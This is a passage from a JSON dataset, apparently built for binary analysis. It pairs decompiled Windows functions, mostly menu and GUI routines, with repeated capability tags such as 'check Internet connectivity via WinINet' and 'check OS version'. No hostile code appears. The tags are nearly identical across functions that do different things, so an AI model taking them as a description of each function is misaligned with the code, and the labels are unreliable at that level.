        "decompiled_code": "\nvoid __fastcall fcn.0043c550(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*(param_1 + 100) != 0) {\n        fcn.004398b8();\n    }\n    if (in_EAX[0x17] == 0) {\n        iVar1 = fcn.00403f28();\n        in_EAX[0x17] = iVar1;\n    }\n    if ((-1 < param_2 + -1) && (param_2 + -1 < *(in_EAX[0x17] + 8))) {\n        iVar1 = fcn.00414eec();\n        if (*(param_1 + 0x3f) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(param_1 + 0x3f)) {\n            fcn.00414eec();\n            fcn.0043c368();\n        }\n    }\n    fcn.0043a818();\n    fcn.00414f68();\n    *(param_1 + 100) = in_EAX;\n    *(param_1 + 0x84) = in_EAX;\n    *(param_1 + 0x80) = fcn.0043c7cc;\n    if (in_EAX[0xd] != 0) {\n        fcn.0043a748();\n    }\n    fcn.0043c3c4();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 352
    },
    "0043c608": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c608(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((-1 < param_2) && (in_EAX[0x17] != 0)) {\n        iVar1 = fcn.0043c3c4();\n        if (param_2 < iVar1) goto code_r0x0043c62e;\n    }\n    fcn.004398b8();\ncode_r0x0043c62e:\n    iVar1 = fcn.00414eec();\n    fcn.00414dd8();\n    *(iVar1 + 100) = 0;\n    *(iVar1 + 0x80) = 0;\n    *(iVar1 + 0x84) = 0;\n    if (in_EAX[0xd] != 0) {\n        fcn.0043a748();\n    }\n    fcn.0043c3c4();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 237
    },
    "0043c7cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c7cc(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if ((arg_8h != '\\0') && ((*(in_EAX + 0x34) != 0 || (*(in_EAX + 0x6c) != 0)))) {\n        fcn.0043a748();\n    }\n    if (*(in_EAX + 100) == 0) {\n        cVar1 = fcn.004040e4();\n        if (cVar1 != '\\0') {\n            fcn.0043e750();\n        }\n    }\n    else {\n        fcn.0043c7cc(0);\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "0043d498": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043d498(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uStack24;\n    int32_t iStack20;\n    \n    uStack24 = 0;\n    if ((param_2 != '\\0') || (((*(in_EAX + 0x1c) & 0x10) == 0 && (cVar1 = fcn.0043d620(),  cVar1 != '\\0')))) {\n        iStack20 = 0;\n        iVar5 = 0;\n        iVar4 = 0;\n        iVar2 = fcn.0043c3c4();\n        iVar3 = iStack20;\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.0043c3d4();\n                if (*(iVar3 + 0x3e) != '\\0') {\n                    fcn.0043c3d4();\n                    cVar1 = fcn.0043d474();\n                    iVar3 = iVar4;\n                    if (cVar1 == '\\0') break;\n                    iVar3 = fcn.0043c3d4();\n                    *(iVar3 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar4 = iVar4 + 1;\n                iVar2 = iVar2 + -1;\n                iVar3 = iStack20;\n            } while (iVar2 != 0);\n        }\n        iStack20 = iVar3;\n        iVar4 = fcn.0043c3c4();\n        if (iStack20 <= iVar4 + -1) {\n            iVar3 = ((iVar4 + -1) - iStack20) + 1;\n            iVar4 = iStack20;\n            do {\n                fcn.0043c3d4();\n                cVar1 = fcn.0043d474();\n                if (cVar1 == '\\0') {\n                    iVar2 = fcn.0043c3d4();\n                    if (*(iVar2 + 0x3e) != '\\0') {\n                        if ((iVar5 != 0) && (*(iVar5 + 0x3e) == '\\0')) {\n                            *(iVar5 + 0x3e) = 1;\n                            uStack24 = 1;\n                        }\n                        iVar5 = 0;\n                        iStack20 = iVar4;\n                    }\n                }\n                else {\n                    if ((iVar5 != 0) && (*(iVar5 + 0x3e) != '\\0')) {\n                        *(iVar5 + 0x3e) = 0;\n                        uStack24 = 1;\n                    }\n                    iVar5 = fcn.0043c3d4();\n                }\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar4 = fcn.0043c3c4();\n        iVar3 = iStack20 - (iVar4 + -1);\n        if (iVar3 == 0 || iStack20 < iVar4 + -1) {\n            iVar3 = iVar3 + -1;\n            do {\n                iVar4 = fcn.0043c3d4();\n                if (*(iVar4 + 0x3e) != '\\0') {\n                    fcn.0043c3d4();\n                    cVar1 = fcn.0043d474();\n                    if (cVar1 == '\\0') break;\n                    iVar4 = fcn.0043c3d4();\n                    *(iVar4 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 != 0);\n        }\n    }\n    return CONCAT44(iStack20, uStack24);\n}\n",
        "token_count": 865
    },
    "0043d5f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuchar fcn.0043d5f0(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3b);\n    if ((*(in_EAX + 0x3b) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.0043d5f0();\n        uVar1 = *((uVar1 & 0x7f) + 0x4914f0);\n    }\n    return *((uVar1 & 0x7f) + 0x4914f4);\n}\n",
        "token_count": 144
    },
    "0043d620": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuchar fcn.0043d620(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3c);\n    if ((*(in_EAX + 0x3c) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.0043d620();\n        uVar1 = *((uVar1 & 0x7f) + 0x4914f0);\n    }\n    return *((uVar1 & 0x7f) + 0x4914f4);\n}\n",
        "token_count": 140
    },
    "0043d650": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0043d650(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    iVar1 = fcn.0043a244();\n    in_EAX[0xd] = iVar1;\n    *(iVar1 + 0x84) = in_EAX;\n    *(iVar1 + 0x80) = *(*in_EAX + 0x38);\n    *(iVar1 + 0x70) = in_EAX;\n    iVar1 = fcn.00403f28();\n    in_EAX[0x11] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x43e190;\n    *(in_EAX + 0x41) = 1;\n    fcn.0041b50c();\n    iVar1 = in_EAX[0xd];\n    *(iVar1 + 0x3b) = 0;\n    *(iVar1 + 0x3c) = 0;\n    fcn.0043e600();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 363
    },
    "0043d7b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0043d7b0(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((*(arg_8h + -1) == '\\0') && (*(arg_8h + -8) == *(in_EAX + 0x50))) ||\n        ((*(arg_8h + -1) == '\\x01' && (*(arg_8h + -8) == *(in_EAX + 0x34))))) ||\n       ((*(arg_8h + -1) == '\\x02' && (*(arg_8h + -8) == *(in_EAX + 0x60))))) {\n        *(arg_8h + -0xc) = in_EAX;\n        var_1h._0_1_ = 1;\n    }\n    else {\n        iVar2 = fcn.0043c3c4();\n        if (-1 < iVar2 + -1) {\n            do {\n                arg_8h_00 = arg_8h;\n                fcn.0043c3d4();\n                cVar1 = fcn.0043d7b0(arg_8h_00);\n                if (cVar1 != '\\0') {\n                    return 1;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 377
    },
    "0043d878": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043d878(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    char cStack20;\n    \n    uVar3 = 0;\n    cStack20 = param_1;\n    if (((cStack20 == '\\0') && (cVar1 = fcn.004040e4(),  cVar1 != '\\0')) &&\n       (iVar2 = (**(*in_EAX + 0x34))(),  param_2 == iVar2)) {\n        uVar3 = fcn.0043ee1c();\n    }\n    else {\n        for (iVar2 = fcn.0043d848(); (iVar2 != 0 && (*(iVar2 + 0x54) == 0)); iVar2 = *(iVar2 + 100)) {\n        }\n        if (iVar2 != 0) {\n            uVar3 = *(iVar2 + 0x54);\n        }\n    }\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 242
    },
    "0043d904": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0043d904(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar7 = 0;\n    piVar4 = fcn.0043d848();\n    if (piVar4 == NULL) {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            cVar3 = fcn.004040e4();\n            if (cVar3 != '\\0') {\n                fcn.0043c8f0();\n            }\n        }\n    }\n    else {\n        if ((*(piVar4 + 7) & 0x10) == 0) {\n            fcn.0043c8f0();\n        }\n        (**(*piVar4 + 0x44))();\n        uVar5 = fcn.0043cfb0();\n        uVar2 = fcn.0043d498();\n        if ((uVar5 | uVar2) != 0) {\n            fcn.0043a748();\n        }\n        uVar1 = *(**0x492b60 + 0x44);\n        uVar5 = uVar5 & 0xffffff00;\n        if (((uVar1 != 0) && (uVar5 = uVar1,  *(uVar1 + 0x277) == '\\x02')) && (piVar4 == *(uVar1 + 0x2a0))) {\n            iVar6 = sub.user32.dll_SendMessageA(*(uVar1 + 0x29c), 0x234, 0, 0);\n            if (iVar6 != 0) {\n                uVar7 = fcn.0044d1c8();\n                sub.user32.dll_DrawMenuBar(uVar7);\n            }\n        }\n        uVar7 = CONCAT31(uVar5 >> 8, 1);\n    }\n    return uVar7;\n}\n",
        "token_count": 461
    },
    "0043d9cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0043d9cc(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x40) == '\\0') && (*(in_EAX + 0x48) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 68
    },
    "0043d9e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043d9e0(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint pwszKLID;\n    uint var_ch;\n    uint hLibModule;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x43db13;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    pwszKLID._0_1_ = 0;\n    puStack56 = &fcn.0043d9e0::pwszKLID;\n    puStack60 = 0x43da0d;\n    sub.user32.dll_GetKeyboardLayoutNameA();\n    puStack60 = 0x43da19;\n    var_ch = fcn.0041e930();\n    uStack64 = 0x43dae9;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x43da37;\n    puStack60 = &stack0xfffffffc;\n    fcn.0041e9d0();\n    puStack72 = 0x43da47;\n    fcn.00405010();\n    puStack72 = 0x43da57;\n    fcn.004050b0();\n    puStack72 = 0x43da62;\n    fcn.0041ea34();\n    puStack72 = 0x43da72;\n    fcn.0041ec64();\n    puStack72 = 0x43da7f;\n    uVar1 = fcn.0040e1e4();\n    uStack76 = 0x43dacc;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    hLibModule = uVar1;\n    pcVar2 = sub.kernel32.dll_GetProcAddress_1(uVar1, 0x43db70);\n    iVar3 = (*pcVar2)();\n    *0x4915c4 = (*(iVar3 + 0x28) & 1) == 1;\n    *in_FS_OFFSET = uVar1;\n    uStack80 = 0x43dad3;\n    sub.kernel32.dll_FreeLibrary_1(hLibModule);\n    return;\n}\n",
        "token_count": 626
    },
    "0043dc20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar __cdecl fcn.0043dc20(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t **in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY36;\n    uint uStackY32;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = '\\x01';\n    iVar1 = (*in_EAX)[0x19];\n    if (iVar1 != 0) {\n        uStackY32 = 0x43dc4e;\n        var_1h._0_1_ = fcn.0043dc20(arg_8h);\n    }\n    if ((var_1h != '\\0') && (var_1h != '\\x03')) {\n        if (var_1h == '\\x02') {\n            if ((*(arg_8h + -4) == 0) || (*(*(arg_8h + -4) + 0x60) != *(arg_8h + -6))) {\n                uVar2 = fcn.0043d848();\n                *(arg_8h + -4) = uVar2;\n                if (*(arg_8h + -4) == 0) {\n                    return '\\x03';\n                }\n            }\n            piVar3 = fcn.0043dc10();\n            *in_EAX = piVar3;\n            if (*in_EAX == NULL) {\n                return '\\x02';\n            }\n            if ((*in_EAX)[0x19] != iVar1) {\n                return '\\x02';\n            }\n            if (in_EDX == 0) {\n                var_1h._0_1_ = '\\x01';\n            }\n        }\n        if (*(*in_EAX + 0x39) == '\\0') {\n            var_1h._0_1_ = '\\0';\n        }\n        else {\n            uStackY32 = 0x43dd46;\n            uStackY36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            if ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0) {\n                fcn.0043c8f0();\n            }\n            (**(**in_EAX + 0x44))();\n            if ((*(arg_8h + -4) == 0) || ((*in_EAX != *(arg_8h + -4) && (*(*(arg_8h + -4) + 0x60) != *(arg_8h + -6)))))\n            {\n                var_1h._0_1_ = '\\x02';\n            }\n            *in_FS_OFFSET = uStackY36;\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 657
    },
    "0043dd74": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0043dd74(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_ch;\n    uint var_6h;\n    \n    puStack36 = 0x43dd88;\n    cVar1 = fcn.0043db84();\n    if (cVar1 != '\\0') {\n        return 0;\n    }\n    puStack36 = 0x43dd97;\n    fcn.0043dbc0();\n    puStack36 = 0x43ddb1;\n    fcn.0041c9dc();\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    uStack40 = 0x43de47;\n    puStack48 = 0x43ddd1;\n    puStack36 = &stack0xfffffffc;\n    iVar2 = fcn.0043d848();\n    if (iVar2 == 0) {\n        *in_FS_OFFSET = uStack44;\n        puStack36 = 0x43de4e;\n        uStack40 = 0x43de46;\n        uVar3 = fcn.0041c9d4();\n        return uVar3;\n    }\n    puStack48 = 0x43dde7;\n    fcn.0041c9dc();\n    uStack52 = 0x43de1c;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.0043dc20(&stack0xfffffffc);\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x43de23;\n    uStack52 = 0x43de1b;\n    uVar3 = fcn.0041c9d4();\n    return uVar3;\n}\n",
        "token_count": 460
    },
    "0043de70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043de70(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uStack152;\n    uint uStack148;\n    uint32_t uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack100;\n    uint uStack96;\n    uchar auStack88 [80];\n    \n    if ((*(*0x492d08 + 0xd) != '\\0') && (in_EAX[0xe] != 0)) {\n        puStack140 = 0x43de97;\n        uVar2 = (**(*in_EAX + 0x34))();\n        uStack136 = 0x2c;\n        uStack132 = 0x10;\n        puStack100 = &stack0xffffffa8;\n        uStack96 = 0x50;\n        uStack144 = 0xffffffff;\n        uStack148 = 0;\n        uStack152 = uVar2;\n        puStack140 = &stack0xffffff78;\n        iVar3 = sub.user32.dll_GetMenuItemInfoA();\n        if (iVar3 != 0) {\n            cVar1 = fcn.0043e204();\n            if (cVar1 != '\\x01' - ((uStack144 & 0x6000) == 0)) {\n                uVar4 = fcn.0043e204();\n                uStack144 = (uVar4 & 0x7f) * 0x6000 | uStack144 & 0xffff9fff;\n                uStack148 = 0x10;\n                iVar3 = sub.user32.dll_SetMenuItemInfoA(uVar2, 0, 0xffffffff, &stack0xffffff68);\n                if (iVar3 != 0) {\n                    sub.user32.dll_DrawMenuBar(in_EAX[0xe]);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 435
    },
    "0043dfd8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0043dfd8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_204h;\n    uint var_200h;\n    \n    arg_8h = &stack0xfffffffc;\n    if (in_EAX[0xe] != 0) {\n        (**(*in_EAX + 0x34))();\n        fcn.0043df2c(arg_8h);\n    }\n    if (in_EAX[0xf] != 0) {\n        fcn.00405264();\n        iVar1 = fcn.00409658();\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    fcn.00405010();\n    return 1;\n}\n",
        "token_count": 174
    },
    "0043e06c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043e06c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(*0x492d08 + 0xd) != '\\0') {\n        var_5h = *(in_EAX + 0x30);\n        var_6h = *(in_EAX + 0x41);\n        uStack20 = 0x43e0e0;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        var_4h = in_EAX;\n        if (var_5h == '\\0') {\n            puStack16 = &stack0xfffffffc;\n            fcn.0043e5dc();\n        }\n        else {\n            fcn.0043e5dc();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x43e0e7;\n        uStack20 = 0x43e0d5;\n        fcn.0043e5dc();\n        *(var_4h + 0x41) = var_6h;\n        return;\n    }\n    return;\n}\n",
        "token_count": 305
    },
    "0043e0ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e0ec(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = param_2;\n    fcn.0043dfd8();\n    if ((*(*0x492d08 + 0xd) != '\\0') && (param_2 != 0)) {\n        if (*(in_EAX + 0x41) == '\\0') {\n            fcn.0043e06c();\n        }\n        else {\n            fcn.0043e600();\n        }\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "0043e204": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0043e204(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x492d08 + 0xd) != '\\0') && (*(in_EAX + 0x30) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 68
    },
    "0043e3b8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e3b8(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(param_2 + 0xc) = 0;\n    var_ch = 0xffffffff;\n    var_10h = 0xffffffff;\n    var_14h = 0xffffffff;\n    iVar3 = sub.user32.dll_GetMenuItemCount(*(param_2 + 8));\n    if (-1 < iVar3 + -1) {\n        uVar5 = 0;\n        var_18h = iVar3;\n        do {\n            uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n            cVar2 = fcn.0043e21c(*(param_2 + 4), &stack0xfffffffc);\n            uVar1 = var_10h;\n            if (cVar2 != '\\0') {\n                if ((uVar4 & 2) == 0) {\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                else if (var_ch < 0) {\n                    var_ch = 0xfffffffe;\n                }\n            }\n            var_10h = uVar1;\n            uVar5 = uVar5 + 1;\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    if (var_ch < -1) {\n        *(param_2 + 0xc) = 0x10000;\n    }\n    else {\n        if ((var_ch < 0) && (-1 < iVar3 + -1)) {\n            uVar5 = 0;\n            var_18h = iVar3;\n            do {\n                uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n                cVar2 = fcn.0043e278(*(param_2 + 4), &stack0xfffffffc);\n                uVar1 = var_10h;\n                if (cVar2 != '\\0') {\n                    if ((uVar4 & 2) != 0) {\n                        *(param_2 + 0xc) = 0x10000;\n                        return;\n                    }\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                var_10h = uVar1;\n                uVar5 = uVar5 + 1;\n                var_18h = var_18h + -1;\n            } while (var_18h != 0);\n        }\n        if (*(param_2 + 0xc) == 2) {\n            *(param_2 + 0xc) = var_ch | 0x20000;\n        }\n        else if (*(param_2 + 0xc) == 3) {\n            if (var_14h < 0) {\n                var_14h = var_ch;\n            }\n            *(param_2 + 0xc) = var_14h | 0x30000;\n        }\n    }\n    return;\n}\n",
        "token_count": 940
    },
    "0043e534": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043e534(uint uFlags, uint cchMax, uchar *lpString)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_4h;\n    \n    cVar1 = fcn.0043d9cc();\n    if (cVar1 == '\\0') {\n        uVar4 = sub.user32.dll_GetMenuStringA();\n    }\n    else {\n        var_4h = 0;\n        uVar2 = sub.user32.dll_GetMenuState();\n        if ((uVar2 & 0x10) == 0) {\n            iVar3 = sub.user32.dll_GetMenuItemID();\n            if (iVar3 != -1) {\n                var_4h = fcn.0043d848();\n            }\n        }\n        else {\n            sub.user32.dll_GetSubMenu();\n            var_4h = fcn.0043d848();\n        }\n        if (var_4h == 0) {\n            uVar4 = 0;\n        }\n        else {\n            *lpString = 0;\n            fcn.00409638();\n            uVar4 = fcn.00409568();\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 277
    },
    "0043e600": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
